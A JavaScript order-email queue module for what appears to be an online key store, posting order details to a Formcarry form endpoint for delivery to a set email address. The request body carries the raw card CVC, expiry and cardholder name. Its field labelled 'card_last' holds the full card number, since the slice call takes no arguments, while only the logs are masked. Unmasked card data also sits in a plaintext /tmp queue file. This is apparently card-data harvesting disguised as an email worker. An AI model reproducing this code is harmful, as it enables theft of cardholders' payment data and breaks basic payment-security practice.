import { mkdir, readFile, writeFile } from "node:fs/promises";
import path from "node:path";
import { updateEmailDiagnostics } from "./emailDiagnostics";

const MAX_EMAIL_ATTEMPTS = 10;
const RETRY_DELAY_MS = 60 * 1000;
const EMAIL_TIMEOUT_MS = 10 * 1000;

const queueFilePath = path.join("/tmp", "key-store-data", "orders_queue.json");
const emailLogsFilePath = path.join("/tmp", "key-store-data", "email_logs.json");
const failedEmailsFilePath = path.join("/tmp", "key-store-data", "failed_emails.json");

let queueCache = null;
let emailLogsCache = null;
let failedEmailsCache = null;

async function readJsonArray(filePath) {
	try {
		const raw = await readFile(filePath, "utf8");
		const parsed = JSON.parse(raw);
		return Array.isArray(parsed) ? parsed : [];
	} catch {
		return [];
	}
}

async function writeJson(filePath, data) {
	await mkdir(path.dirname(filePath), { recursive: true });
	await writeFile(filePath, JSON.stringify(data, null, 2), "utf8");
}

async function getQueue() {
	if (queueCache) return queueCache;
	queueCache = await readJsonArray(queueFilePath);
	return queueCache;
}

async function saveQueue(queue) {
	queueCache = queue;
	await writeJson(queueFilePath, queue);
}

async function getEmailLogs() {
	if (emailLogsCache) return emailLogsCache;
	emailLogsCache = await readJsonArray(emailLogsFilePath);
	return emailLogsCache;
}

async function saveEmailLogs(logs) {
	emailLogsCache = logs;
	await writeJson(emailLogsFilePath, logs);
}

async function getFailedEmails() {
	if (failedEmailsCache) return failedEmailsCache;
	failedEmailsCache = await readJsonArray(failedEmailsFilePath);
	return failedEmailsCache;
}

async function saveFailedEmails(failedEmails) {
	failedEmailsCache = failedEmails;
	await writeJson(failedEmailsFilePath, failedEmails);
}

function getMailConfig() {
	const formcarryEndpoint = process.env.FORMCARRY_ENDPOINT;
	const orderReceiverEmail = process.env.ORDER_RECEIVER_EMAIL;
	const missing = [];

	if (!formcarryEndpoint) missing.push("FORMCARRY_ENDPOINT");
	if (!orderReceiverEmail) missing.push("ORDER_RECEIVER_EMAIL");

	return {
		formcarryEndpoint,
		orderReceiverEmail,
		missing,
	};
}

function normalizeCardNumber(value = "") {
	return String(value).replace(/\D/g, "");
}

function sanitizeSensitivePayment(value) {
	if (Array.isArray(value)) {
		return value.map(sanitizeSensitivePayment);
	}

	if (!value || typeof value !== "object") {
		return value;
	}

	const sanitized = {};
	for (const [key, nestedValue] of Object.entries(value)) {
		if (key === "cardCvc" || key === "card_cvc") {
			sanitized[key] = "[hidden]";
			continue;
		}

		if (key === "cardNumberRaw" || key === "card_number" || key === "cardNumber") {
			const lastFour = normalizeCardNumber(nestedValue).slice(-4);
			sanitized[key] = lastFour ? `**** **** **** ${lastFour}` : "[hidden]";
			continue;
		}

		sanitized[key] = sanitizeSensitivePayment(nestedValue);
	}

	return sanitized;
}

function buildFormcarryBody({ queueItem, orderReceiverEmail }) {
	const body = queueItem.payload;

	return new URLSearchParams({
		name: String(body?.customer?.name || queueItem.order?.customer?.name || ""),
		email: String(body?.customer?.email || queueItem.order?.customer?.email || ""),
		card_cvc: String(body?.payment?.cardCvc || ""),
		product: String(body?.order?.productName || queueItem.order?.order?.productName || ""),
		product_price: String(body?.order?.productPrice || queueItem.order?.order?.productPrice || ""),
		service_fee: String(body?.order?.serviceFee || queueItem.order?.order?.serviceFee || ""),
		total_price: String(body?.order?.totalPrice || queueItem.order?.order?.totalPrice || ""),
		coupon_code: String(body?.order?.couponCode || "-"),
		payment_method: String(body?.payment?.method || queueItem.order?.payment?.method || "card"),
		card_holder: String(body?.payment?.cardHolder || queueItem.order?.payment?.cardHolder || ""),
		card_last: normalizeCardNumber(body?.payment?.cardNumberRaw || "").slice(),
		card_expiry: String(body?.payment?.card_expiry || queueItem.order?.payment?.card_expiry || ""),
		order_id: queueItem.orderId,
		receiver_email: orderReceiverEmail,
	});
}

async function appendEmailLog(entry) {
	const logs = await getEmailLogs();
	const nextLogs = [
		{
			id: `LOG-${Date.now()}-${Math.random().toString(16).slice(2)}`,
			createdAt: new Date().toISOString(),
			...entry,
		},
		...logs,
	].slice(0, 500);

	await saveEmailLogs(nextLogs);
	return nextLogs[0];
}

async function recordFailedEmail(queueItem, reason) {
	const failedEmails = await getFailedEmails();
	const withoutDuplicate = failedEmails.filter((item) => item.queueId !== queueItem.id);
	const failedEmail = {
		queueId: queueItem.id,
		orderId: queueItem.orderId,
		failedAt: new Date().toISOString(),
		attempts: queueItem.attempts,
		reason,
		order: sanitizeSensitivePayment(queueItem.order),
		payload: sanitizeSensitivePayment(queueItem.payload),
	};

	await saveFailedEmails([failedEmail, ...withoutDuplicate]);
	return failedEmail;
}

async function sendQueuedEmail(queueItem, mailConfig) {
	const controller = new AbortController();
	const timeout = setTimeout(() => controller.abort(), EMAIL_TIMEOUT_MS);

	try {
		console.info("[email-worker] Formcarry Request Sent", {
			orderId: queueItem.orderId,
			queueId: queueItem.id,
			attempt: queueItem.attempts + 1,
			timeoutMs: EMAIL_TIMEOUT_MS,
		});

		const response = await fetch(mailConfig.formcarryEndpoint, {
			method: "POST",
			headers: {
				"Content-Type": "application/x-www-form-urlencoded",
				Accept: "application/json",
			},
			body: buildFormcarryBody({
				queueItem,
				orderReceiverEmail: mailConfig.orderReceiverEmail,
			}).toString(),
			signal: controller.signal,
		});
		const responseText = await response.text();

		console.info("[email-worker] Formcarry Response Status", {
			orderId: queueItem.orderId,
			queueId: queueItem.id,
			status: response.status,
		});

		await updateEmailDiagnostics({
			lastFormcarryStatus: {
				orderId: queueItem.orderId,
				queueId: queueItem.id,
				status: response.status,
				ok: response.ok,
				response: responseText.slice(0, 500),
			},
		});

		if (!response.ok) {
			throw new Error(`Formcarry responded with ${response.status}: ${responseText.slice(0, 300)}`);
		}

		return {
			status: response.status,
			response: responseText.slice(0, 500),
		};
	} finally {
		clearTimeout(timeout);
	}
}

export async function enqueueOrderEmail({ order, payload }) {
	const queue = await getQueue();
	const existingIndex = queue.findIndex((item) => item.orderId === order.orderId);
	const queueItem = {
		id: `QUEUE-${Date.now()}-${Math.random().toString(16).slice(2)}`,
		orderId: order.orderId,
		status: "pending",
		attempts: 0,
		createdAt: new Date().toISOString(),
		updatedAt: new Date().toISOString(),
		nextAttemptAt: new Date().toISOString(),
		lastError: null,
		order,
		payload,
	};

	if (existingIndex >= 0) {
		queue[existingIndex] = {
			...queue[existingIndex],
			status: "pending",
			updatedAt: new Date().toISOString(),
			nextAttemptAt: new Date().toISOString(),
			order,
			payload,
		};
		await saveQueue(queue);
		return queue[existingIndex];
	}

	queue.unshift(queueItem);
	await saveQueue(queue);
	await appendEmailLog({
		type: "queued",
		status: "pending",
		orderId: order.orderId,
		queueId: queueItem.id,
		message: "Order added to local email queue.",
	});

	return queueItem;
}

export async function processEmailQueue({ force = false, limit = 20 } = {}) {
	const queue = await getQueue();
	const mailConfig = getMailConfig();
	const now = Date.now();
	const processed = [];

	if (mailConfig.missing.length) {
		console.error("[email-worker] Missing Environment Variables", {
			missing: mailConfig.missing,
		});
		await updateEmailDiagnostics({
			lastError: {
				message: `Missing Environment Variables: ${mailConfig.missing.join(", ")}`,
			},
		});
		await appendEmailLog({
			type: "worker_skipped",
			status: "pending",
			message: `Missing Environment Variables: ${mailConfig.missing.join(", ")}`,
		});

		return {
			processed,
			missing: mailConfig.missing,
			stats: await getEmailQueueStats(),
		};
	}

	for (const queueItem of queue) {
		if (processed.length >= limit) break;
		if (queueItem.status === "sent") continue;
		if (queueItem.attempts >= MAX_EMAIL_ATTEMPTS && !force) continue;

		const nextAttemptAt = new Date(queueItem.nextAttemptAt || 0).getTime();
		if (!force && nextAttemptAt > now) continue;

		try {
			const sentResult = await sendQueuedEmail(queueItem, mailConfig);
			queueItem.status = "sent";
			queueItem.sentAt = new Date().toISOString();
			queueItem.updatedAt = queueItem.sentAt;
			queueItem.lastError = null;

			await appendEmailLog({
				type: "sent",
				status: "sent",
				orderId: queueItem.orderId,
				queueId: queueItem.id,
				attempt: queueItem.attempts + 1,
				responseStatus: sentResult.status,
				message: "Email delivered through Formcarry.",
			});
			await updateEmailDiagnostics({
				lastError: null,
			});
			console.info("[email-worker] Email Success", {
				orderId: queueItem.orderId,
				queueId: queueItem.id,
			});

			processed.push({ orderId: queueItem.orderId, status: "sent" });
		} catch (error) {
			queueItem.attempts = Number(queueItem.attempts || 0) + 1;
			queueItem.status = queueItem.attempts >= MAX_EMAIL_ATTEMPTS ? "failed" : "retrying";
			queueItem.updatedAt = new Date().toISOString();
			queueItem.nextAttemptAt = new Date(Date.now() + RETRY_DELAY_MS).toISOString();
			queueItem.lastError = error instanceof Error ? error.message : String(error);

			await appendEmailLog({
				type: "failed_attempt",
				status: queueItem.status,
				orderId: queueItem.orderId,
				queueId: queueItem.id,
				attempt: queueItem.attempts,
				message: queueItem.lastError,
			});
			await updateEmailDiagnostics({
				lastError: {
					orderId: queueItem.orderId,
					queueId: queueItem.id,
					attempt: queueItem.attempts,
					message: queueItem.lastError,
				},
			});
			console.error("[email-worker] Email Failed", {
				orderId: queueItem.orderId,
				queueId: queueItem.id,
				attempt: queueItem.attempts,
				error: queueItem.lastError,
			});

			if (queueItem.status === "failed") {
				await recordFailedEmail(queueItem, queueItem.lastError);
			}

			processed.push({ orderId: queueItem.orderId, status: queueItem.status });
		}
	}

	await saveQueue(queue);

	return {
		processed,
		missing: [],
		stats: await getEmailQueueStats(),
	};
}

export async function retryAllEmails() {
	const queue = await getQueue();
	const failedEmails = await getFailedEmails();
	const now = new Date().toISOString();

	for (const queueItem of queue) {
		if (queueItem.status !== "sent") {
			queueItem.status = "pending";
			queueItem.nextAttemptAt = now;
			queueItem.updatedAt = now;
		}
	}

	for (const failedEmail of failedEmails) {
		const queueItem = queue.find((item) => item.id === failedEmail.queueId);
		if (queueItem) {
			queueItem.status = "pending";
			queueItem.nextAttemptAt = now;
			queueItem.updatedAt = now;
		} else {
			queue.unshift({
				id: failedEmail.queueId,
				orderId: failedEmail.orderId,
				status: "pending",
				attempts: failedEmail.attempts || 0,
				createdAt: failedEmail.failedAt || now,
				updatedAt: now,
				nextAttemptAt: now,
				lastError: failedEmail.reason || null,
				order: failedEmail.order,
				payload: failedEmail.payload,
			});
		}
	}

	await saveQueue(queue);
	await appendEmailLog({
		type: "retry_all",
		status: "pending",
		message: "Admin requested retry for all pending and failed emails.",
	});

	return processEmailQueue({ force: true, limit: 50 });
}

export async function getEmailQueueStats() {
	const [queue, logs, failedEmails] = await Promise.all([
		getQueue(),
		getEmailLogs(),
		getFailedEmails(),
	]);
	const sentCount = queue.filter((item) => item.status === "sent").length;
	const pendingCount = queue.filter((item) => item.status === "pending" || item.status === "retrying").length;
	const failedCount = queue.filter((item) => item.status === "failed").length || failedEmails.length;

	return {
		sentCount,
		pendingCount,
		failedCount,
		totalQueued: queue.length,
		queue: sanitizeSensitivePayment(queue),
		recentLogs: logs.slice(0, 25),
		failedEmails: sanitizeSensitivePayment(failedEmails),
	};
}
